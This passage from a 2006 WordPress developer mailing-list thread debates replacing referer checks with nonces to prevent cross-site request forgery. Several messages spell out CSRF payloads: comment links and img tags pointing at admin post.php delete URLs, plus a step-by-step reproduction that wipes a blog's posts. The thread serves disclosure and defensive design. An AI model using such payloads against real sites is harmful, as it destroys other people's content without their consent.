checks, there are other ways to perform checks, and that's what we are
discussing.

> Read this a few times and you start to see the real dangers here:
> http://www.tux.org/~peterw/csrf.txt

We all know what CSRF is already, please read the rest of the thread
before proceeding.

> >So the first thing we should be doing is confirming every action that
> >could be accessed externally.  This is really freaking annoying, as I've
> >noticed with deleting moderated comments from email in 2.1, since I
> >didn't have to confirm those in < 2.1 and now I do.
>
> One solution I see this for all this is to give WordPress two different
> methods of security.  Then these would be selectable in User profile. Either
> the admin/user must have a valid referer from an admin section to do any
> admin function, OR they will have to deal with an excesive number of AYS
> prompts.

Owen's idea was based on Mark's original idea. Instead of checking
referers, which has its own issues (personal firewalls, corporate
firewalls, Norton), we formulate random, unique tokens that a request
must include in order to pass. A forged request in an image form would
have no way of knowing this key, and so instead of completing the
action, at that point we prompt again, including the "nounce" to
verify that a human is clicking the link and is confirming that they
want this to happen.
> BTW I've seen complaints about the security risk known as the Preview Post
> Feature.  I never understood why it was a risk until writing this reply.  I
> think, basically, with the right (wrong) plugin enabled, the Preview could
> allow user-supplied content to have an admin referer context. Couldn't it?
> Could a plugin that shows user supplied avatars with recent comments, embed
> a redirected url with an admin level request that would pass the admin
> referer check?

I think you are terribly confused about "referer contexts" and what
exactly you're talking about.

--
--Robert Deaton
http://somethingunpredictable.com
From dmhouse at gmail.com  Mon Apr 17 15:27:20 2006
From: dmhouse at gmail.com (David House)
Date: Mon Apr 17 15:31:15 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604170756h18deacb0g9abec4e763f73546@mail.gmail.com>
References: <44439BAE.9040401@midnightcircus.com>
	<D0252C90757CBC4B8BC938A72BEDDF9DF9804E@dsimail.drbsystems.com>
	<a491f91d0604170756h18deacb0g9abec4e763f73546@mail.gmail.com>
Message-ID: <ebe43d680604170827s1ed5d8f0p983465f27a0ffad4@mail.gmail.com>

On 17/04/06, Robert Deaton <false.hopes@gmail.com> wrote:
> I think you are terribly confused about "referer contexts" and what
> exactly you're talking about.

The confusion here is that any link clicked from within the preview
window has a referer of an admin page, so it would bypass the referer
checks. This means that potentially, you could click a destructive
link like that image redirection example and destroy one of your
posts. This would probably have been left in a comment to an
already-published post, which you subsequently edit.

The thing I'm not sure about is whether any requests made from an
iframe (i.e. images) takes the iframe's URL as a referer or if it
inherits the parent page's (in the latter case we'd have a CSRF
problem).

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From Brian at TheCodeCave.com  Mon Apr 17 15:45:04 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 17 15:49:01 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604170756h18deacb0g9abec4e763f73546@mail.gmail.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF9804F@dsimail.drbsystems.com>

>We are trying to get rid of referrer checks, there are other ways 
>to perform checks, and that's what we are discussing.
>Owen's idea was based on Mark's original idea. Instead of checking
>referers, which has its own issues (personal firewalls, corporate
>firewalls, Norton), we formulate random, unique tokens that a request
>must include in order to pass. 

I understand that and I have read the entire thread. The point I was trying
to make is that since the referrer check seems to be the most full proof
method to block a CSRF attack and it is only certain users that have
conditions that strip/block the referrer, perhaps removing that check
entirely is not the best solution.  Providing an alternate method for only
those that have an issue with the primary line of defense should be an
option.

My first reply suggested building that into the user profile because: 
1. I'm not sure that the nonce suggestion can be made completely foolproof.
Just in this thread, a few objections were raised.  It doesn't look like its
been completely worked out yet.
2. I thought Mark was suggesting using AYS prompts as the only security.  I
see now that he was suggesting that only for plugins that haven't added the
nonce.  That's a much better approach than putting AYSs everywhere by
default.  It could probably be enhanced one step further. If the referrer
check passes, why should the users deal with that extra prompt?  Again,
another reason not to dismiss the referrer check entirely.

I was also swayed by this text in the link I referenced:
>> Alternatively, the sessionid could be
>> required to come with the GET/POST request variables, rather than by
cookie.
>...thereby exposing an important piece of authentication information to
>history files and proxy servers; I really don't like URL mangling for
>authentication purposes, especially in non-SSL systems. A combination of
>cookie + URL mangling might not be bad, though in the message board case, a
>CSRF attacker could use an intermediate redirect (as described earlier) to
>get the URL mangling (from the Referer), and redirect back to the
>messageboard with the proper mangling as well as all cookies that might be
>expected/needed. So in your example case, URL mangling would buy nothing.
:-(


>> think, basically, with the right (wrong) plugin enabled, the Preview
could
>> allow user-supplied content to have an admin referer context. Couldn't
it?
>I think you are terribly confused about "referer contexts" and what
>exactly you're talking about.

You're right that I might be missing something here, which is why I asked
the question.  

If I am working in http://www.somewpblog.com/wp-admin/post.php and click on
a link in the preview post, I don't know what my referrer would show as...

OK, I tested this by creating a post that was simply a link to
"/wp-admin/post.php?action=delete&post=101" and it comes up with "Sorry, you
need to enable sending referrers for this feature to work.".  So apparently
this is not a concern and I still don't know why people view the preview
feature as an issue. 

From Brian at TheCodeCave.com  Mon Apr 17 15:49:55 2006
From: Brian at TheCodeCave.com (Brian Layman)
Date: Mon Apr 17 15:53:56 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <ebe43d680604170827s1ed5d8f0p983465f27a0ffad4@mail.gmail.com>
Message-ID: <D0252C90757CBC4B8BC938A72BEDDF9DF98050@dsimail.drbsystems.com>

>The thing I'm not sure about is whether any requests made from an
>iframe (i.e. images) takes the iframe's URL as a referer or if it
>inherits the parent page's (in the latter case we'd have a CSRF
>problem).

Well put.  Thank you.

_______________________________________________
Brian Layman
www.TheCodeCave.com
 

From false.hopes at gmail.com  Mon Apr 17 15:51:50 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Apr 17 15:55:46 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9804F@dsimail.drbsystems.com>
References: <a491f91d0604170756h18deacb0g9abec4e763f73546@mail.gmail.com>
	<D0252C90757CBC4B8BC938A72BEDDF9DF9804F@dsimail.drbsystems.com>
Message-ID: <a491f91d0604170851r14af26c5p84f9ca05e6400634@mail.gmail.com>

On 4/17/06, Brian Layman <Brian@thecodecave.com> wrote:
> You're right that I might be missing something here, which is why I asked
> the question.
>
> If I am working in http://www.somewpblog.com/wp-admin/post.php and click on
> a link in the preview post, I don't know what my referrer would show as...
>
> OK, I tested this by creating a post that was simply a link to
> "/wp-admin/post.php?action=delete&post=101" and it comes up with "Sorry, you
> need to enable sending referrers for this feature to work.".  So apparently
> this is not a concern and I still don't know why people view the preview
> feature as an issue.

That's right, iframes send referers as the src of the iframe from
which the link was clicked, not the hosting page, as a security
feature.

--
--Robert Deaton
http://somethingunpredictable.com
From ringmaster at midnightcircus.com  Mon Apr 17 16:04:05 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Apr 17 16:04:11 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <D0252C90757CBC4B8BC938A72BEDDF9DF9804F@dsimail.drbsystems.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF9804F@dsimail.drbsystems.com>
Message-ID: <4443BC75.6090907@midnightcircus.com>

Brian Layman wrote:
> My first reply suggested building that into the user profile because: 
> 1. I'm not sure that the nonce suggestion can be made completely foolproof.
> Just in this thread, a few objections were raised.  It doesn't look like its
> been completely worked out yet.

It can be made completely foolproof, it's just inconvenient to plugins 
that use admin pages until they are modified to use the nonces.  I'm not 
sure what other objections you're talking about.

> 2. I thought Mark was suggesting using AYS prompts as the only security.  I
> see now that he was suggesting that only for plugins that haven't added the
> nonce.  That's a much better approach than putting AYSs everywhere by
> default.  It could probably be enhanced one step further. If the referrer
> check passes, why should the users deal with that extra prompt?  Again,
> another reason not to dismiss the referrer check entirely.

Realistically, AYS prompts *are* the only necessary security to prevent 
CSRF attacks, because the only time they work is when there is no 
confirmation on the action that is executed.

Assuming you don't want to confirm every action every time, you'll need 
another method to verify that you're coming from somewhere where it's 
permitted to initiate that action.  This can be done with the nonces, as 
described.

Why not include both methods?  Because the referer check doesn't work in 
all clients, and the nonce does.  The nonce is also more flexible, since 
it produces a confirmation message when the nonce is required but not 
present, which you can't do with just the referer check.  You can also 
include valid nonces in URLs in email, which you can't do with a referer 
check.  Including both methods would require them both to be present in 
the code, which requires more testing and support.

Owen


From jjb at ibiblio.org  Mon Apr 17 16:22:13 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Mon Apr 17 16:26:08 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
Message-ID: <Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>

I have had neither coffee nor lunch yet today so maybe I am forgetting 
something obvious, but: isn't the biggest problem with with security 
through referer checks that referers can be trivially spoofed from the 
client side? Or to put it another way, the http client has the option of 
supplying an arbitrary referer string?

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/

From false.hopes at gmail.com  Mon Apr 17 16:30:31 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Apr 17 16:34:29 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
Message-ID: <a491f91d0604170930se67297bte327a0680bd9ded3@mail.gmail.com>

On 4/17/06, John Joseph Bachir <jjb@ibiblio.org> wrote:
> I have had neither coffee nor lunch yet today so maybe I am forgetting
> something obvious, but: isn't the biggest problem with with security
> through referer checks that referers can be trivially spoofed from the
> client side? Or to put it another way, the http client has the option of
> supplying an arbitrary referer string?

Without a cookie, that doesn't really matter at this stage of the
game, we're assuming that the user's cookie hasn't been stolen, if it
has, the fact that referers can be spoofed is trivial then as well,
considering that with a cookie you can just log right in. Checking
referers here is not the security issue, its a convenience issue,
because more and more people are disabling referer sending, whether it
be voluntary, firewalls, Norton, etc.

>
> John
> ----
> aim/yim/msn/jabber.org: johnjosephbachir
> 713.494.2704
> irc://irc.freenode.net/lyceum
> http://lyceum.ibiblio.org/
> http://blog.johnjosephbachir.org/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
--Robert Deaton
http://somethingunpredictable.com
From jjb at ibiblio.org  Mon Apr 17 16:48:04 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Mon Apr 17 16:52:04 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <a491f91d0604170930se67297bte327a0680bd9ded3@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<a491f91d0604170930se67297bte327a0680bd9ded3@mail.gmail.com>
Message-ID: <Pine.LNX.4.61.0604171242560.10835@tribal.metalab.unc.edu>

On Mon, 17 Apr 2006, Robert Deaton wrote:

> On 4/17/06, John Joseph Bachir <jjb@ibiblio.org> wrote:
>> I have had neither coffee nor lunch yet today so maybe I am forgetting
>> something obvious, but: isn't the biggest problem with with security
>> through referer checks that referers can be trivially spoofed from the
>> client side? Or to put it another way, the http client has the option of
>> supplying an arbitrary referer string?
>
> Without a cookie, that doesn't really matter at this stage of the
> game, we're assuming that the user's cookie hasn't been stolen, if it
> has, the fact that referers can be spoofed is trivial then as well,
> considering that with a cookie you can just log right in. Checking
> referers here is not the security issue, its a convenience issue,
> because more and more people are disabling referer sending, whether it
> be voluntary, firewalls, Norton, etc.

Well, an exploit like that would require getting a malicious binary onto 
the victim's computer. So I suppose we would be protecting against a case 
where an attacker can get a binary onto a user's computer, but can't get 
the cookie _off_ of their computer (which is easier to do). A bit far 
fetched I suppose... until someone makes a Outlook worm to install such a 
binary.  :)

John
From jjb at ibiblio.org  Mon Apr 17 16:52:29 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Mon Apr 17 16:56:25 2006
Subject: [wp-hackers] sessions vs. cookies
Message-ID: <Pine.LNX.4.61.0604171248480.10835@tribal.metalab.unc.edu>

(starting a new thread to keep things tiddy)

>> (as an aside, why is authentication done directly with cookies instead 
>> of with sessions?)

> Protecting session ids is a chore, they're sent back and forth on each 
> request, and anybody who manages to steal one now has full access as a 
> user. The only way sessions can be more secure than cookies is if its 
> all done over SSL, something that is not an option for the everday blog

Isn't it currently the case that the double-hashed password is sent on 
every request, and anyone who manages to steal it has full access as a 
user?

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/

From r at robm.me.uk  Mon Apr 17 17:19:29 2006
From: r at robm.me.uk (Rob)
Date: Mon Apr 17 17:20:43 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
Message-ID: <4443CE21.40402@robm.me.uk>

John Joseph Bachir wrote:
> I have had neither coffee nor lunch yet today so maybe I am forgetting 
> something obvious, but: isn't the biggest problem with with security 
> through referer checks that referers can be trivially spoofed from the 
> client side? Or to put it another way, the http client has the option 
> of supplying an arbitrary referer string?
>
> John
> ----
> aim/yim/msn/jabber.org: johnjosephbachir
> 713.494.2704
> irc://irc.freenode.net/lyceum
> http://lyceum.ibiblio.org/
> http://blog.johnjosephbachir.org/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
Not really, since the attack vector here requires an attacker to have a 
logged-in user make the request, thus removing any possibility of them 
manipulating the HTTP headers, and therefore spoofing the referrer, 
since all the requests will be done from the client's end.

-- 
Rob Miller
http://robm.me.uk/ | http://kantian.co.uk/

From stewart at ugelow.com  Mon Apr 17 18:08:56 2006
From: stewart at ugelow.com (Stewart Ugelow)
Date: Mon Apr 17 18:12:51 2006
Subject: [wp-hackers] geocomments?
In-Reply-To: <294271AF-2818-406F-A542-FFA202140A0B@txfx.net>
References: <c8d0d7750604111731t463aec59s7366be7224330d15@mail.gmail.com>
	<5aa3aa0604112040j44dcdb3cq766a047f843d4860@mail.gmail.com>
	<443C93B6.2080201@midnightcircus.com>
	<0C36BB65-E94A-4AF1-8458-C94AD995AEFA@txfx.net>
	<7c94a5850604131439w30a86e48v73dfa2c32fa48d48@mail.gmail.com>
	<294271AF-2818-406F-A542-FFA202140A0B@txfx.net>
Message-ID: <7c94a5850604171108o5ab143d6qf38e49db3426c5b3@mail.gmail.com>

Owen, Mark, Dougal et al,

Thanks much for your explanations. Much good stuff to ponder. Some of
these DB issues seem positively like black magic and hearing your
thoughts is quite helpful.

--Stewart

P.S. Mark, I'm guessing a fair chunk of your post meta table is Kramer
inbound data, no? :)

On 4/13/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:

> My post meta table is huge... tens of thousands of entries...
From dmhouse at gmail.com  Mon Apr 17 19:04:26 2006
From: dmhouse at gmail.com (David House)
Date: Mon Apr 17 19:08:21 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
Message-ID: <ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>

On 17/04/06, John Joseph Bachir <jjb@ibiblio.org> wrote:
> I have had neither coffee nor lunch yet today so maybe I am forgetting
> something obvious, but: isn't the biggest problem with with security
> through referer checks that referers can be trivially spoofed from the
> client side? Or to put it another way, the http client has the option of
> supplying an arbitrary referer string?

Yes they are, but admin referers are to protect admins from themselves (ish).

A malicious commentor leaves a comment saying "hey, nice post, here's
[my reponse]" with a link to what appears to be their site but is in
fact something like
http://yoursite.com/wp-admin/post.php?action=delete&post=123. Before
you know it, you've just deleted post 123. Oops. This can be done with
images as well, so you don't even have to click anything.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From wp-hackers at paul-mitchell.me.uk  Mon Apr 17 19:23:33 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Mon Apr 17 19:28:17 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
Message-ID: <4443EB35.3020908@paul-mitchell.me.uk>

David House wrote:
> Yes they are, but admin referers are to protect admins from themselves (ish).
>
> A malicious commentor leaves a comment saying "hey, nice post, here's
> [my reponse]" with a link to what appears to be their site but is in
> fact something like
> http://yoursite.com/wp-admin/post.php?action=delete&post=123. Before
> you know it, you've just deleted post 123. Oops. This can be done with
> images as well, so you don't even have to click anything.
>   
This makes wp-admin/edit-comments.php and wp-admin/moderation.php
extremely dangerous as the admin referer check is ineffective.

I placed the URL to delete a post in a comment, then from "Manage
Comments" clicked on the link and deleted the post. Likewise with
moderation, where I made an author URL the delete post link.

Paul

From dmhouse at gmail.com  Mon Apr 17 19:38:16 2006
From: dmhouse at gmail.com (David House)
Date: Mon Apr 17 19:42:13 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4443EB35.3020908@paul-mitchell.me.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
Message-ID: <ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>

On 17/04/06, Paul Mitchell <wp-hackers@paul-mitchell.me.uk> wrote:
> This makes wp-admin/edit-comments.php and wp-admin/moderation.php
> extremely dangerous as the admin referer check is ineffective.

Yeah, this is a flaw in the current system. I _think_ nonces would fix
this, someone else would have to verify that.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From peter.westwood at ftwr.co.uk  Mon Apr 17 21:48:12 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Mon Apr 17 21:52:53 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <45BDF613-E564-457F-AFFE-115208D0A4BE@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<444337B0.3040004@mullenweg.com>
	<45BDF613-E564-457F-AFFE-115208D0A4BE@txfx.net>
Message-ID: <44440D1C.2030304@ftwr.co.uk>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Mark Jaquith wrote:
> On Apr 17, 2006, at 2:37 AM, Matt Mullenweg wrote:
> 
>>> 1) function wp_secure_form($key='') { }
>>> This function would echo out a hidden from input with an md5 hash
>>> computed on (a) the database password, (b) the userid, and (c) the
>>> optional key.  This would give us a hash that is unique to the
>>> specific WP user on that install, and optionally, specific to the
>>> particular task being performed.  For example, for deleting a post,
>>> you could do wp_secure_form('delete_post_' . $post_id); and it would
>>> be locked down to the install, the user, the "delete" action, and
>>> that specific post.
>>
>> Unfortunately this doesn't work, because it's trivial to fetch the
>> page and grab the key/nonce before submitting the malicious request.
> 
> How could this be done without <script> injection (a security problem in
> its own right)?  It may just be that it is 4am, but without injection of
> a malicious script, in which case the security breach has already
> occurred, I can't see how you are going to load the page as the
> authenticated user and extract the key.  There's probably a "oh, duh"
> answer to this, but I just can't see it now.
> 

I'm not sure that the how is really the issue here.

To me it's more that you _cannot_ rely on generating a key as a one time
operation "per user" / "per action type".

You need to generate a nonce "per action" and have that stored within
the db - in say user meta information and timed out so that it doesn't
last forever otherwise it is next to useless as it allows for any type
multi pronged off line attack.

For example with you solution one attack can get the key and another can
use it!

You must remember that the whole point behind a nonce [1] rather than a
key is that it is for one-time use only - if you can use it more than
once it's security benefit is removed.

1 - http://en.wikipedia.org/wiki/Nonce

westi
- --
Peter Westwood
http://blog.ftwr.co.uk
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.2 (MingW32)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org

iD8DBQFERA0cVPRdzag0AcURApRwAKCbmcnyqA2dW8nh5+akku8rP+FxUwCdFiIS
zhGuUCo+54QjXk5w7nF9p+U=
=594X
-----END PGP SIGNATURE-----

From thunderlove at gmail.com  Mon Apr 17 21:55:53 2006
From: thunderlove at gmail.com (Geoff Johnson)
Date: Mon Apr 17 21:59:47 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
Message-ID: <80ed0cc70604171455l51997dcei8acb482b57fe89a9@mail.gmail.com>

I'm wondering if there is any need for a key/PID...  What if a random value
was used each time, and saved as an admin cookie?

A unique id could be generated each time an admin page is viewed, and
embedded in the link.

<pre>
<?php

$cval = md5( rand() . time() . microtime() );
setcookie( 'testCookie', $cval );

if( !isset( $_REQUEST['passkey'] ) ) {
?>
        <a href="/test.php?passkey=<?php echo $cval; ?>">test it!</a>
<?php
} else if ( $_COOKIE['testCookie'] === $_REQUEST['passkey'] ) {
?>
        <h3>Access Granted</h3>
<?php
} else {
?>
        <h3>Access Denied</h3>
<?php
}
?>
</pre>
From m at mullenweg.com  Tue Apr 18 00:36:43 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue Apr 18 00:40:59 2006
Subject: [wp-hackers] sessions vs. cookies
In-Reply-To: <Pine.LNX.4.61.0604171248480.10835@tribal.metalab.unc.edu>
References: <Pine.LNX.4.61.0604171248480.10835@tribal.metalab.unc.edu>
Message-ID: <4444349B.1090206@mullenweg.com>

John Joseph Bachir wrote:
> Isn't it currently the case that the double-hashed password is sent on 
> every request, and anyone who manages to steal it has full access as a 
> user?

Correct. Just as anyone who steals a session token has access to that 
user's session.

In several years, I have not heard about anyone getting their cookie 
stolen and having their blog messed with, even though this is a pretty 
trivial hack theoretically.

For blogs with heightened security requirements I'd recommend the 
secure-admin[1] plugin, which encrypts everything and puts the sensitive 
bits under a SSL-only cookie. However for most people, including myself, 
this would be overkill.

[1] http://downloads.wordpress.org/plugin/secure-admin.zip
[1] http://dev.wp-plugins.org/browser/secure-admin/

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From mark.wordpress at txfx.net  Tue Apr 18 01:26:59 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Tue Apr 18 01:31:01 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <44440D1C.2030304@ftwr.co.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<444337B0.3040004@mullenweg.com>
	<45BDF613-E564-457F-AFFE-115208D0A4BE@txfx.net>
	<44440D1C.2030304@ftwr.co.uk>
Message-ID: <AB4192DE-6B01-480C-8F49-FF4FE4D8DF56@txfx.net>

On Apr 17, 2006, at 5:48 PM, Peter Westwood wrote:

> You need to generate a nonce "per action" and have that stored within
> the db - in say user meta information and timed out so that it doesn't
> last forever otherwise it is next to useless as it allows for any type
> multi pronged off line attack.
>
> For example with you solution one attack can get the key and  
> another can
> use it!

Again, my question is: HOW can an attacker get the key if it is only  
showed on admin pages where the login has been validated via  
cookies?  An attacker would have to trick a logged-in user into  
clicking a link that would give the attacker the key by extracting it  
from the document... but that's not a CSF attack, that's a XSS  
attack, and it is its own security vulnerability that has to be fixed  
by validating/filtering input data.  And if you can inject a script,  
the current referer-based checks can be bypassed anyway.

--
Mark Jaquith
http://txfx.net/


From jjb at ibiblio.org  Tue Apr 18 02:56:34 2006
From: jjb at ibiblio.org (John Joseph Bachir)
Date: Tue Apr 18 03:00:32 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <AB4192DE-6B01-480C-8F49-FF4FE4D8DF56@txfx.net>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<444337B0.3040004@mullenweg.com>
	<45BDF613-E564-457F-AFFE-115208D0A4BE@txfx.net>
	<44440D1C.2030304@ftwr.co.uk>
	<AB4192DE-6B01-480C-8F49-FF4FE4D8DF56@txfx.net>
Message-ID: <Pine.LNX.4.61.0604172156490.7660@tribal.metalab.unc.edu>


On Mon, 17 Apr 2006, Mark Jaquith wrote:

> On Apr 17, 2006, at 5:48 PM, Peter Westwood wrote:
>
>> You need to generate a nonce "per action" and have that stored within 
>> the db - in say user meta information and timed out so that it doesn't 
>> last forever otherwise it is next to useless as it allows for any type 
>> multi pronged off line attack.
>> 
>> For example with you solution one attack can get the key and another 
>> can use it!
>
> Again, my question is: HOW can an attacker get the key if it is only 
> showed on admin pages where the login has been validated via cookies? 
> An attacker would have to trick a logged-in user into clicking a link 
> that would give the attacker the key by extracting it from the 
> document... but that's not a CSF attack, that's a XSS attack, and it is 
> its own security vulnerability that has to be fixed by 
> validating/filtering input data.  And if you can inject a script, the 
> current referer-based checks can be bypassed anyway.

I think what Peter is at least partly addressing is some flavor of a brute 
force attack. Of course a simple brute force attack over the space of sha1 
or even md5 would take too long to be worth it. But if any of the pieces 
in the system are compromised, the range can be cut down considerably... 
for example if an exploit is found in the php random function, then the 
attacker can narrow down the possible hashes considerably. There are 
probably a few other brute-force-space-reduction potential opportunities 
that we could think of, and dozens of others that exist now or in the 
future.

The way around this is to have access to the token on the server side 
involve authentication information. Then our token system cannot even be 
attempted to be exploited, or at least not without compromising the 
authentication system itself (stealing/intercepting cookies).

When Lyceum generates a token...

 	$token = sha1(uniqid(rand(), TRUE));
 	$key = sha1($targetscript.$action.$id.$userdata->ID);
 	$_SESSION['formtokens'][$key][$token] = time();

...the key to access the token is a hash that includeds the user id. So 
the tokens can only be accessed by a logged-in user, and the token system 
is as secure as the authentication system.

John
----
aim/yim/msn/jabber.org: johnjosephbachir
713.494.2704
irc://irc.freenode.net/lyceum
http://lyceum.ibiblio.org/
http://blog.johnjosephbachir.org/

From wp-hackers at paul-mitchell.me.uk  Tue Apr 18 09:03:30 2006
From: wp-hackers at paul-mitchell.me.uk (Paul Mitchell)
Date: Tue Apr 18 09:08:16 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
Message-ID: <4444AB62.8070807@paul-mitchell.me.uk>

David House wrote:
> Yeah, this is a flaw in the current system. I _think_ nonces would fix
> this, someone else would have to verify that.
>   
God Bless the English language and its diversity! Who chose the word
"nonce"? http://www.urbandictionary.com/define.php?term=nonce

Anyway, this "flaw in the current system" is nuclear. It allows a
trivial remotely-exploitable escalation of privilege with ultimate
destructive power.

I ran my test on the latest 2.1-alpha1.

1. New blog.
2. Admin user configures blog to allow anyone to register and the
default user level to Contributor.
3. "Bad Guy" registers.
4. Admin writes a sequence of posts.
5. "Bad Guy" logs in and posts a draft consisting of:
    <img
src='http://www.vanishingblog.com/blog/wp-admin/post.php?action=delete&post=1"
/>
    <img
src='http://www.vanishingblog.com/blog/wp-admin/post.php?action=delete&post=2"
/>
    ...
    <img
src='http://www.vanishingblog.com/blog/wp-admin/post.php?action=delete&post=999"
/>
6. Admin notices the new draft, opens it in the editor and puzzles over
the broken image links.
7. Admin notices the blog is gone.

My bug report for this flaw would be "In all known versions of
WordPress, anyone trusted to write a draft can also nuke the blog" and I
would classify it "critical security". I'm glad I don't have to fix this
one.

Paul

From dmhouse at gmail.com  Tue Apr 18 09:11:40 2006
From: dmhouse at gmail.com (David House)
Date: Tue Apr 18 09:15:39 2006
Subject: [wp-hackers] Rethinking check_admin_referer()
In-Reply-To: <4444AB62.8070807@paul-mitchell.me.uk>
References: <245DF276-2083-4B6D-BEB0-86E85D9BD96B@txfx.net>
	<Pine.LNX.4.61.0604171220050.9566@tribal.metalab.unc.edu>
	<ebe43d680604171204k6d3bc5e7r588a63339d0ad12f@mail.gmail.com>
	<4443EB35.3020908@paul-mitchell.me.uk>
	<ebe43d680604171238t4a12ee0sd1703026f66615f7@mail.gmail.com>
	<4444AB62.8070807@paul-mitchell.me.uk>
Message-ID: <ebe43d680604180211h646ea933g22a0051718ea51aa@mail.gmail.com>

On 18/04/06, Paul Mitchell <wp-hackers@paul-mitchell.me.uk> wrote:
> My bug report for this flaw would be "In all known versions of
> WordPress, anyone trusted to write a draft can also nuke the blog" and I
> would classify it "critical security". I'm glad I don't have to fix this
> one.

How about this:

1) Admin writes a post.
2) Malicious user leaves a comment with an "image", whose source
redirecs to http://yoursite.com/wp-admin/post.php?action=delete&post=123
3) Admin logs in
4) Manage -> Comments
5) Post is deleted.

No need to be able to create drafts.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From mark.wordpress at txfx.net  Tue Apr 18 10:30:44 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
